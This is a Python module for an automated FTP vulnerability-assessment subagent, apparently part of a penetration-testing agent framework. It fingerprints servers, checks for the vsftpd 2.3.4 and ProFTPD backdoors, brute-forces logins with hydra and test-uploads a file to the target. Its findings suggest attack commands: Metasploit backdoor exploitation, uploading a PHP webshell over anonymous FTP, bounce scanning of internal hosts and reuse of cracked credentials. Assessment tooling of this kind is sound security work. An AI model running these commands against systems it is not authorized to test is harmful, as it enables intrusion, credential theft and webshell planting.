"""
ftp_vuln_subagent.py — FTP service vulnerability assessment.

AGENT_NAME   : "vuln"
SUBAGENT_NAME: "ftp_vuln"

Methodology:
  1. Banner grab and version fingerprint
  2. Anonymous login test
  3. NSE scripts: ftp-anon, ftp-bounce, ftp-proftpd-backdoor, ftp-vsftpd-backdoor
  4. Brute-force with common FTP credentials (hydra)
  5. Check for writable directories and upload capability
  6. FTP bounce attack feasibility
  7. CVE lookup for identified version
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_ANON_RE     = re.compile(r'(anonymous.*login|230.*login|ftp.*ok|login successful)', re.I)
_BACKDOOR_RE = re.compile(r'(backdoor|0day|malicious|BACKDOOR FOUND|vsftpd.*2\.3\.4|proftpd.*1\.3\.3)', re.I)
_WRITABLE_RE = re.compile(r'(drw|d-w|writable|STOR.*ok|226.*Transfer|250.*ok)', re.I)
_VERSION_RE  = re.compile(r'(vsFTPd|ProFTPD|FileZilla|Pure-FTPd|wu-ftpd|Microsoft FTP)\s*([\d.]+)', re.I)
_CVE_TARGETS = {
    "vsftpd 2.3.4":    "CVE-2011-2523",
    "proftpd 1.3.3":   "CVE-2010-4221",
    "wu-ftpd":         "CVE-2000-0573",
}


class FtpVulnSubagent(BaseSubagent):
    """Assess FTP service for authentication, backdoor, and misconfiguration vulnerabilities."""

    AGENT_NAME    = "vuln"
    SUBAGENT_NAME = "ftp_vuln"

    async def run(self, target: str, port: int = 21, **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        # ── 1. Banner grab + version ───────────────────────────────────
        banner_out = await self.collect_tool("bash", target,
            {"options": f"-c \"echo -e 'QUIT\\r' | nc -w 5 {target} {port} 2>&1 | head -5\""})
        ver_match = _VERSION_RE.search(banner_out)
        version   = f"{ver_match.group(1)} {ver_match.group(2)}" if ver_match else banner_out[:80]

        await self.store_finding(Finding(
            title=f"FTP: Service Detected — {version}",
            description=f"FTP banner: {banner_out.strip()[:200]}",
            severity="INFO",
            evidence=banner_out[:300], tool="bash", host=target, port=port,
            mitre_technique="T1210",
        ))

        # ── 2. Backdoor check (vsftpd 2.3.4 / ProFTPD 1.3.3) ─────────
        nmap_backdoor = await self.collect_tool("nmap", target,
            {"options": f"-p {port} --script ftp-proftpd-backdoor,ftp-vsftpd-backdoor -sV {target}"})
        if _BACKDOOR_RE.search(nmap_backdoor):
            cve = "CVE-2011-2523" if "vsftpd" in nmap_backdoor.lower() else "CVE-2010-4221"
            await self.store_finding(Finding(
                title=f"FTP CRITICAL: Backdoor Detected ({cve}) on {target}:{port}",
                description=f"Vulnerable FTP version with known backdoor: {version}. Exploit available in Metasploit.",
                severity="CRITICAL",
                evidence=nmap_backdoor[:600], tool="nmap", host=target, port=port,
                cve=cve, mitre_technique="T1210",
                exploit_suggestion=(
                    f"msf > use exploit/unix/ftp/vsftpd_234_backdoor\n"
                    f"msf > set RHOSTS {target}\n"
                    f"msf > set RPORT {port}\n"
                    f"msf > run"
                ),
            ))

        # ── 3. Anonymous login ─────────────────────────────────────────
        anon_out = await self.collect_tool("nmap", target,
            {"options": f"-p {port} --script ftp-anon {target}"})
        anon_login = _ANON_RE.search(anon_out) or "Anonymous FTP login allowed" in anon_out

        if anon_login:
            # List files as anonymous
            list_out = await self.collect_tool("bash", target,
                {"options": f"-c \"curl -sk --user anonymous:anonymous ftp://{target}:{port}/ 2>&1 | head -30\""})
            writable = _WRITABLE_RE.search(list_out)
            await self.store_finding(Finding(
                title=f"FTP: Anonymous Login ALLOWED{'  — Writable Directory' if writable else ''}",
                description=(
                    f"Anonymous FTP login permitted on {target}:{port}. "
                    f"Directory listing:\n{list_out[:300]}"
                ),
                severity="HIGH" if not writable else "CRITICAL",
                evidence=anon_out[:400] + "\n" + list_out[:300],
                tool="nmap", host=target, port=port, mitre_technique="T1078.001",
                exploit_suggestion=(
                    f"Browse: curl -sk --user anonymous:anonymous ftp://{target}:{port}/\n"
                    f"Upload: curl -sk -T /tmp/shell.php --user anonymous:anonymous ftp://{target}:{port}/"
                    if writable else f"Download: wget -m --user=anonymous --password='' ftp://{target}:{port}/"
                ),
            ))

        # ── 4. FTP bounce attack ───────────────────────────────────────
        bounce_out = await self.collect_tool("nmap", target,
            {"options": f"-p {port} --script ftp-bounce {target}"})
        if "bounce working" in bounce_out.lower() or "BOUNCE" in bounce_out:
            await self.store_finding(Finding(
                title=f"FTP: Bounce Attack Possible — {target}:{port}",
                description="FTP server allows bounce attacks, enabling port scanning of internal networks via PORT command.",
                severity="MEDIUM",
                evidence=bounce_out[:400], tool="nmap", host=target, port=port,
                mitre_technique="T1046",
                exploit_suggestion=f"nmap -p 1-1024 -Pn -b anonymous:anonymous@{target}:{port} <internal_target>",
            ))

        # ── 5. Brute-force common credentials ─────────────────────────
        hydra_out = await self.collect_tool("bash", target,
            {"options": (
                f"-c \"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                f"-P /usr/share/seclists/Passwords/Common-Credentials/best15.txt "
                f"-t 4 -o /tmp/ftp_brute.txt ftp://{target}:{port} 2>&1 | tail -10\""
            )})
        # [54] hydra prints the service port in brackets, e.g. "[21][ftp] host: ...".
        # This MUST be an f-string so {port} interpolates the real port — the old plain
        # r-string matched the literal characters "{port}", which never appear in hydra
        # output, so every cracked FTP credential was silently dropped.
        hydra_hits = re.findall(
            rf'\[{port}\]\s*\[ftp\]\s*host:\s*\S+\s*login:\s*(\S+)\s*password:\s*(\S+)', hydra_out)
        if hydra_hits:
            await self.store_finding(Finding(
                title=f"FTP: Brute-Force Credentials Found — {hydra_hits[0][0]}:{hydra_hits[0][1]}",
                description=f"Valid FTP credentials discovered:\n" + "\n".join([f"  {u}:{p}" for u, p in hydra_hits[:5]]),
                severity="CRITICAL",
                evidence=hydra_out[:400], tool="bash", host=target, port=port,
                mitre_technique="T1110.003",
                exploit_suggestion=f"curl -sk --user {hydra_hits[0][0]}:{hydra_hits[0][1]} ftp://{target}:{port}/",
            ))

        # ── 6. Writable upload test (if logged in) ────────────────────
        if anon_login:
            upload_out = await self.collect_tool("bash", target,
                {"options": f"-c \"echo 'test' | curl -sk -T - --user anonymous:anonymous ftp://{target}:{port}/test_write_$(date +%s).txt 2>&1\""})
            if "226" in upload_out or "Transfer complete" in upload_out:
                await self.store_finding(Finding(
                    title=f"FTP: Unauthenticated File Upload — Anonymous Write Confirmed",
                    description="Files can be uploaded as anonymous user. Could be used to plant webshells if FTP root is in web directory.",
                    severity="CRITICAL",
                    evidence=upload_out[:200], tool="bash", host=target, port=port,
                    mitre_technique="T1105",
                    exploit_suggestion=(
                        f"Upload webshell: curl -T shell.php --user anonymous:anonymous ftp://{target}:{port}/\n"
                        f"Access at: http://{target}/shell.php"
                    ),
                ))

        # ── 7. Known CVE check ────────────────────────────────────────
        for ver_pattern, cve in _CVE_TARGETS.items():
            if ver_pattern.lower() in version.lower():
                await self.store_finding(Finding(
                    title=f"FTP: Known CVE — {cve} ({ver_pattern})",
                    description=f"FTP version matches known vulnerable release: {version}. CVE: {cve}",
                    severity="CRITICAL",
                    evidence=version, tool="bash", host=target, port=port,
                    cve=cve, mitre_technique="T1210",
                    exploit_suggestion=f"searchsploit '{ver_pattern}'; msfconsole -x 'search {cve}'",
                ))

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
